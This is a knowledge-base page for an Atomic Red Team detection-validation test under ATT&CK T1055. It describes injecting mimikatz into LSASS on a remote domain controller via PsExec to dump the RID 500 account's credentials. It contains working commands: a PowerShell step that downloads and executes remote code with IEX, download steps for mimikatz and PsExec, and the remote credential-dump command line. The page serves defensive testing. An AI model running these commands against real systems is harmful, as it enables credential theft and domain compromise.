---
atomic_guid: "3203ad24-168e-4bec-be36-f79b13ef8a83"
title: "Remote Process Injection in LSASS via mimikatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1055"
attack_technique_name: "Process Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.yaml"
build_date: "2026-04-27 19:12:26"
executor: "command_prompt"
aliases:
  - "3203ad24-168e-4bec-be36-f79b13ef8a83"
  - "Remote Process Injection in LSASS via mimikatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
Especially useful against domain controllers in Active Directory environments.
It must be executed in the context of a user who is privileged on remote `machine`.

The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>

## ATT&CK Mapping

- [[kb/attack/techniques/T1055-process_injection|T1055: Process Injection]]

## Input Arguments

### machine

- description: machine to target (via psexec)
- type: string
- default: DC1

### mimikatz_path

- description: Mimikatz windows executable
- type: path
- default: %tmp%\mimikatz\x64\mimikatz.exe

### psexec_path

- description: Path to PsExec
- type: string
- default: PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe

## Dependencies

Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

### Prerequisite Check

```powershell
$mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
```

PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})

### Prerequisite Check

```powershell
if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools" -Force
New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe" "#{psexec_path}" -Force
```

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
"#{psexec_path}" /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.yaml)
